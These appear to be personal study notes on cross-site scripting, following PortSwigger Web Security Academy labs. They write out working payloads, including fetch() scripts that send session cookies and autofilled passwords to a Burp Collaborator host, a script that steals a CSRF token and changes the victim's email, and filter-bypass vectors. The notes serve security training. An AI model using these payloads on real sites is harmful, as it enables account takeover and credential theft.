                              ## What is cross-site scripting (XSS)?
# Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.
# From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling alert(). As these are used to construct some of the more advanced XSS attacks, you'll sometimes need to use an alternative PoC payload. In this scenario, we recommend the print() function.

                            ## What are the types of XSS attacks?
   
    1. ## Reflected XSS, where the malicious script comes from the current HTTP request.
    2. ## Stored XSS, where the malicious script comes from the website's database.
    3. ## DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
    
                       ## Reflected cross-site scripting                         
Reflected XSS is the simplest variety of cross-site scripting.It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

EXAMPLE:
           https://insecure-website.com/status?message=All+is+well.
           <p>Status: All is well.</p>
 
 The application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this: 
         https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
         <p>Status: <script>/* Bad stuff here... */</script></p>
         
If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access. 

                                     ## 2. Stealing Cookies using xss
 ## 2.1 Exploiting cross-site scripting to steal cookies    
 ------->
   1. The victim might not be logged in.
   2.  Many applications hide their cookies from JavaScript using the HttpOnly flag.
   3. Sessions might be locked to additional factors like the user's IP address.
   4.  The session might time out before you're able to hijack it.

    
    alert(document.domain)
    
                                        <script>
                                    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
                                    method: 'POST',
                                    mode: 'no-cors',
                                    body:document.cookie
                                    });
                                    </script>

scripting using burp collaborator: 




                           
                                                   ## Exploiting cross-site scripting to capture passwords
 # These days, many users have password managers that auto-fill their passwords.
 # You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain.
 # This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. 
 
 # The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.) 
 
 
                           <input name=username id=username>
                          <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
                          method:'POST',
                          mode: 'no-cors',
                          body:username.value+':'+this.value
                          });">
                          
                          
                                                 ## Exploiting cross-site scripting to perform CSRF
                                                 
 # Anything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin. 

# Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account. 

# This type of exploit is typically referred to as cross-site request forgery (CSRF), which is slightly confusing because CSRF can also occur as a standalone vulnerability. When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present


                          <script>
                          var req = new XMLHttpRequest();
                          req.onload = handleResponse;
                          req.open('get','/my-account',true);
                          req.send();
                          function handleResponse() {
                              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
                              var changeReq = new XMLHttpRequest();
                              changeReq.open('post', '/my-account/change-email', true);
                              changeReq.send('csrf='+token+'&email=test@test.com')
                          };
                          </script>

                          This will make anyone who views the comment issue a POST request to change their email address to test@test.com. 
                          
                          
                          
                                <SOURCE-CODE>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="UVQTBTZWsVWuXuFh3vVVzfWBhJG5VbuI">
                            <button class='button' type='submit'> Update email </button>
                        </form>    
                        
  If you view the source for the page, you'll see the following information:

   >> You need to issue a POST request to /my-account/change-email, with a parameter called email.
   >> There's an anti-CSRF token in a hidden input called token.
   
   This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address. 
   
   
                             <script>
                          var req = new XMLHttpRequest();
                          req.onload = handleResponse;
                          req.open('get','/my-account',true);
                          req.send();
                          function handleResponse() {
                              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
                              var changeReq = new XMLHttpRequest();
                              changeReq.open('post', '/my-account/change-email', true);
                              changeReq.send('csrf='+token+'&email=test@test.com')
                          };
                          </script>

                          This will make anyone who views the comment issue a POST request to change their email address to test@test.com
                          
                          
                          ## Reflected XSS in different contexts
#  There are many different varieties of reflected cross-site scripting. The location of the reflected data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.

# In addition, if the application performs any validation or other processing on the submitted data before it is reflected, this will generally affect what kind of XSS payload is needed.                           


# When testing for reflected and stored XSS, a key task is to identify the XSS context:

   >> The location within the response where attacker-controllable data appears.
   >> Any input validation or other processing that is being performed on that data by the application.
                          
                          # XSS between HTML tags
Some useful ways of executing JavaScript are: 
  <script>alert(document.domain)</script>
  <img src=1 onerror=alert(1)>

                        
                        
                              ## REFLECTIVE XSS INTO HTML WITH MOST TAG BLOCKED
STEP1: In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: <> 
STEP2: Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <§§>
STEP3: Visit the XSS cheat sheet and click "Copy tags to clipboard". 
STEP4: Go back to the Positions tab in Burp Intruder and replace your search term with: <body%20=1>
STEP5: Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <body%20§§=1>

# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>

                       
                       ## REFLECTIVE XSS WHERE ALL THE TAGS ARE BLOCKED
# <script>
  location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
  </script>                           
                        


                   ## Reflected XSS with event handlers and href attributes blocked
# This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.. 
# To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function. 
#  Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
<a href="">Click me</a>

# https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
                          
                      
